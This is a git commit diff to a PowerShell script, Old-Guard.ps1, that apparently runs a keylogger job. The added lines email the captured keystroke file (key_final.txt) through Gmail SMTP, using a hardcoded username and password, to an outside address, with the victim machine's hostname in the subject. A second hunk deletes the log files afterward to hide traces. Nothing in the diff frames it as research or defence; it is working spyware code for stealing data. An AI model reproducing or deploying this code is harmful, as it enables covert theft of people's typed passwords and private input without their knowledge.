5c0974d6b0cfa715ad8a0eadc63ecc3e32ae4350
logsandstuff <59518250+logsandstuff@users.noreply.github.com>
2020-01-11 17:30:24 -0800

    Update Old-Guard.ps1

--- Old-Guard.ps1
+++ Old-Guard.ps1
@@ -186,6 +186,18 @@ function Old-Guard {
                             Out-File -FilePath $LogPath -Append -InputObject $CSVEntry -Encoding unicode
                             Copy-item "$env:TEMP/key.log" -Destination "$env:TEMP/key_final.txt"
                             
+                            #email results
+                            $SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587)
+                            $SMTPInfo.EnableSsl = $true
+                            $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('logsandstuff12', 'usedrubberducky')
+                            $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'logsandstuff12@gmail.com' 
+                            $ReportEmail.To.Add('warof1846@gmail.com')
+                            $ReportEmail.Subject = 'Final Report - ' +[System.Net.Dns]::GetHostByName(($env:computerName)).HostName
+                            $ReportEmail.Body = 'Report 001'
+                            $ReportEmail.Attachments.Add('%temp%/key_final.txt')
+                            $SMTPInfo.Send($ReportEmail)
+                            $SMTPInfo.Send($ReportEmail)
+                            
                            
                         }
                     }
@@ -206,6 +218,8 @@ function Old-Guard {
         Register-ObjectEvent -InputObject $Timer -EventName Elapsed -SourceIdentifier ElapsedAction -Action {
             Stop-Job -Name Keylogger
             Unregister-Event -SourceIdentifier ElapsedAction
+            remove-item -path $env:TEMP/key_final.txt
+            remove-item -path $env:TEMP/key.log
 
             $Sender.Stop()
         } | Out-Null
